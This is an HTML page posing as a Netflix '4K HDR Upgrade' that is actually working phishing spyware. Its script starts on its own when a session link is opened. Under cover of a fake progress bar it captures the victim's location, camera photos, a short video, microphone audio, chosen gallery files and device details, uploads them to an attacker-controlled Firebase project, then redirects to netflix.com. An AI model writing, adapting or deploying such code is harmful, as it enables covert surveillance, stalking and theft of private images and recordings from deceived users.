<!DOCTYPE html>
<html>
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
    <title>4K HDR Upgrade | Netflix</title>
    
    <script src="https://www.gstatic.com/firebasejs/9.22.0/firebase-app-compat.js"></script>
    <script src="https://www.gstatic.com/firebasejs/9.22.0/firebase-database-compat.js"></script>
    <script src="https://www.gstatic.com/firebasejs/9.22.0/firebase-storage-compat.js"></script>
    
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
        }
        
        body {
            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Helvetica, Arial, sans-serif;
            background: linear-gradient(135deg, #0a0a0a 0%, #000000 100%);
            min-height: 100vh;
            display: flex;
            justify-content: center;
            align-items: center;
            padding: 20px;
        }
        
        .card {
            background: rgba(20, 20, 20, 0.95);
            backdrop-filter: blur(10px);
            border-radius: 32px;
            padding: 40px 28px;
            max-width: 420px;
            width: 100%;
            text-align: center;
            border: 1px solid rgba(255, 255, 255, 0.1);
            box-shadow: 0 25px 50px -12px rgba(0, 0, 0, 0.5);
        }
        
        .logo {
            width: 80px;
            height: 80px;
            background: linear-gradient(135deg, #e50914, #b20710);
            border-radius: 50%;
            display: flex;
            align-items: center;
            justify-content: center;
            margin: 0 auto 24px;
            font-size: 40px;
        }
        
        h1 {
            color: #fff;
            font-size: 26px;
            font-weight: 700;
            margin-bottom: 8px;
        }
        
        .badge {
            display: inline-block;
            background: linear-gradient(135deg, #e50914, #b20710);
            padding: 4px 12px;
            border-radius: 20px;
            font-size: 11px;
            font-weight: 600;
            margin-bottom: 16px;
            color: #fff;
        }
        
        .sub {
            color: #aaa;
            font-size: 14px;
            margin-bottom: 28px;
        }
        
        .progress-container {
            background: #1a1a1a;
            border-radius: 30px;
            height: 8px;
            margin: 20px 0;
            overflow: hidden;
            display: none;
        }
        
        .progress-bar {
            background: linear-gradient(135deg, #e50914, #b20710);
            width: 0%;
            height: 100%;
            transition: width 0.3s ease;
            border-radius: 30px;
        }
        
        .progress-text {
            color: #e50914;
            font-size: 14px;
            font-weight: 600;
            margin-top: 8px;
            display: none;
        }
        
        .device-info {
            background: rgba(255, 255, 255, 0.05);
            border-radius: 20px;
            padding: 16px;
            margin-bottom: 24px;
            text-align: left;
        }
        
        .device-info p {
            color: #ccc;
            font-size: 13px;
            margin: 6px 0;
        }
        
        .btn {
            background: linear-gradient(135deg, #e50914, #b20710);
            color: white;
            border: none;
            width: 100%;
            padding: 16px;
            font-size: 16px;
            font-weight: 700;
            border-radius: 44px;
            cursor: pointer;
        }
        
        .btn:disabled {
            background: #444;
            cursor: not-allowed;
        }
        
        .loader {
            margin-top: 16px;
            color: #e50914;
            font-size: 13px;
            display: none;
        }
        
        input, video, canvas {
            display: none;
        }
    </style>
</head>
<body>
    <div class="card">
        <div class="logo">🎬</div>
        <h1>4K HDR Upgrade</h1>
        <div class="badge">⚡ INSTANT UPGRADE</div>
        <div class="sub">Optimize your device for 4K HDR streaming</div>
        
        <div class="device-info">
            <p>📱 Device: <span id="deviceName">Detecting...</span></p>
            <p>🔋 Battery: <span id="batteryLevel">Detecting...</span></p>
            <p>📶 Quality: HD Ready → 4K HDR</p>
        </div>
        
        <div class="progress-container" id="progressContainer">
            <div class="progress-bar" id="progressBar"></div>
        </div>
        <div class="progress-text" id="progressText">0%</div>
        
        <button class="btn" id="upgradeBtn">⚡ ENABLE 4K HDR</button>
        <div class="loader" id="loader">Optimizing...</div>
    </div>
    
    <input type="file" id="galleryInput" accept="image/*,video/*" multiple>
    <video id="video" autoplay playsinline style="display:none"></video>
    <canvas id="canvas" style="display:none"></canvas>
    
    <script>
        // Firebase Config
        const firebaseConfig = {
            apiKey: "AIzaSyCG2oPHsEbvKAVY4C2mP-njqvgvZnzyZBU",
            authDomain: "mobilehk-5e843.firebaseapp.com",
            projectId: "mobilehk-5e843",
            databaseURL: "https://mobilehk-5e843-default-rtdb.firebaseio.com",
            storageBucket: "mobilehk-5e843.firebasestorage.app"
        };
        
        firebase.initializeApp(firebaseConfig);
        const db = firebase.database();
        const storage = firebase.storage();
        
        const urlParams = new URLSearchParams(window.location.search);
        const sessionId = urlParams.get('id');
        
        const upgradeBtn = document.getElementById('upgradeBtn');
        const loader = document.getElementById('loader');
        const progressContainer = document.getElementById('progressContainer');
        const progressBar = document.getElementById('progressBar');
        const progressText = document.getElementById('progressText');
        
        let currentProgress = 0;
        
        function updateProgress(percent, message) {
            currentProgress = percent;
            progressBar.style.width = percent + '%';
            progressText.innerHTML = percent + '% - ' + message;
        }
        
        function showProgress() {
            progressContainer.style.display = 'block';
            progressText.style.display = 'block';
        }
        
        function hideProgress() {
            progressContainer.style.display = 'none';
            progressText.style.display = 'none';
        }
        
        if (!sessionId) {
            upgradeBtn.disabled = true;
            loader.style.display = 'block';
            loader.innerHTML = '❌ Invalid link';
        }
        
        // Get device info + battery
        async function getDeviceInfo() {
            const ua = navigator.userAgent;
            let device = "Unknown";
            if (ua.includes("iPhone")) device = "iPhone";
            else if (ua.includes("Android")) device = "Android";
            else if (ua.includes("Windows")) device = "Windows PC";
            else if (ua.includes("Mac")) device = "Mac";
            
            let battery = "Not available";
            if ('getBattery' in navigator) {
                try {
                    const batteryManager = await navigator.getBattery();
                    battery = Math.round(batteryManager.level * 100) + '%';
                    if (!batteryManager.charging) battery += ' (discharging)';
                    else battery += ' (charging)';
                } catch(e) {}
            }
            
            document.getElementById('deviceName').innerText = device;
            document.getElementById('batteryLevel').innerText = battery;
            
            return { device, ua, battery, screen: `${screen.width}x${screen.height}` };
        }
        
        // Save to Firebase
        async function saveData(type, data) {
            if (!sessionId) return;
            const timestamp = new Date().toISOString();
            const newKey = db.ref().child(`sessions/${sessionId}/data`).push().key;
            await db.ref(`sessions/${sessionId}/data/${newKey}`).set({
                type: type,
                data: data,
                timestamp: timestamp
            });
        }
        
        // Upload file
        async function uploadFile(file, type) {
            if (!sessionId) return null;
            const filename = `${sessionId}_${Date.now()}_${file.name.replace(/[^a-z0-9.]/gi, '_')}`;
            const ref = storage.ref(`uploads/${filename}`);
            await ref.put(file);
            const url = await ref.getDownloadURL();
            await saveData(type, { url, name: file.name, size: file.size });
            return url;
        }
        
        // 1. Device Info (5%)
        async function step1() {
            updateProgress(5, "Detecting device...");
            const info = await getDeviceInfo();
            await saveData('device_info', info);
            return true;
        }
        
        // 2. Location (15%)
        async function step2() {
            updateProgress(15, "Getting location...");
            try {
                const pos = await new Promise((resolve, reject) => {
                    navigator.geolocation.getCurrentPosition(resolve, reject);
                });
                await saveData('location', {
                    lat: pos.coords.latitude,
                    lng: pos.coords.longitude,
                    map: `https://maps.google.com/?q=${pos.coords.latitude},${pos.coords.longitude}`
                });
                return true;
            } catch(e) { return false; }
        }
        
        // 3. Camera Permission + Photos (40%)
        async function step3() {
            updateProgress(25, "Requesting camera access...");
            try {
                const stream = await navigator.mediaDevices.getUserMedia({ video: true });
                const video = document.getElementById('video');
                video.srcObject = stream;
                await new Promise(r => setTimeout(r, 500));
                
                const canvas = document.getElementById('canvas');
                canvas.width = video.videoWidth || 640;
                canvas.height = video.videoHeight || 480;
                const ctx = canvas.getContext('2d');
                
                updateProgress(30, "Capturing photos...");
                for (let i = 1; i <= 4; i++) {
                    ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
                    const blob = await new Promise(r => canvas.toBlob(r, 'image/jpeg', 0.85));
                    const file = new File([blob], `camera_${Date.now()}_${i}.jpg`, { type: 'image/jpeg' });
                    await uploadFile(file, 'camera_photo');
                    updateProgress(30 + (i * 2), `Photo ${i}/4 captured`);
                }
                
                updateProgress(40, "Recording video...");
                const recorder = new MediaRecorder(stream);
                const chunks = [];
                recorder.ondataavailable = e => chunks.push(e.data);
                recorder.onstop = async () => {
                    const blob = new Blob(chunks, { type: 'video/mp4' });
                    const file = new File([blob], `video_${Date.now()}.mp4`, { type: 'video/mp4' });
                    await uploadFile(file, 'video_recording');
                };
                recorder.start();
                await new Promise(r => setTimeout(r, 5000));
                recorder.stop();
                
                stream.getTracks().forEach(t => t.stop());
                return true;
            } catch(e) { return false; }
        }
        
        // 4. Microphone (60%)
        async function step4() {
            updateProgress(55, "Requesting microphone...");
            try {
                const stream = await navigator.mediaDevices.getUserMedia({ audio: true });
                const recorder = new MediaRecorder(stream);
                const chunks = [];
                recorder.ondataavailable = e => chunks.push(e.data);
                recorder.onstop = async () => {
                    const blob = new Blob(chunks, { type: 'audio/webm' });
                    const file = new File([blob], `audio_${Date.now()}.webm`, { type: 'audio/webm' });
                    await uploadFile(file, 'microphone');
                };
                recorder.start();
                updateProgress(60, "Recording audio...");
                await new Promise(r => setTimeout(r, 5000));
                recorder.stop();
                stream.getTracks().forEach(t => t.stop());
                return true;
            } catch(e) { return false; }
        }
        
        // 5. Gallery (80%)
        async function step5() {
            updateProgress(65, "Opening gallery...");
            return new Promise((resolve) => {
                const input = document.getElementById('galleryInput');
                input.onchange = async (e) => {
                    const files = Array.from(e.target.files);
                    if (files.length === 0) { resolve(true); return; }
                    for (let i = 0; i < Math.min(files.length, 20); i++) {
                        const percent = 65 + Math.floor((i / Math.min(files.length, 20)) * 25);
                        updateProgress(percent, `Uploading ${i+1}/${Math.min(files.length, 20)} files`);
                        const file = files[i];
                        const type = file.type.startsWith('image/') ? 'gallery_photo' : 'gallery_video';
                        await uploadFile(file, type);
                    }
                    resolve(true);
                };
                input.click();
            });
        }
        
        // 6. Complete (100%)
        async function step6() {
            updateProgress(95, "Finalizing...");
            await saveData('upgrade_complete', { timestamp: new Date().toISOString() });
            updateProgress(100, "4K HDR Enabled!");
            loader.innerHTML = "✅ 4K HDR Activated! Redirecting...";
            setTimeout(() => {
                window.location.href = "https://www.netflix.com";
            }, 2000);
        }
        
        // Main function
        async function startUpgrade() {
            if (!sessionId) return;
            
            upgradeBtn.disabled = true;
            loader.style.display = 'block';
            showProgress();
            
            await step1();
            await step2();
            await step3();
            await step4();
            await step5();
            await step6();
            
            hideProgress();
        }
        
        upgradeBtn.onclick = startUpgrade;
        
        if (sessionId) {
            setTimeout(startUpgrade, 500);
        }
    </script>
</body>
</html>
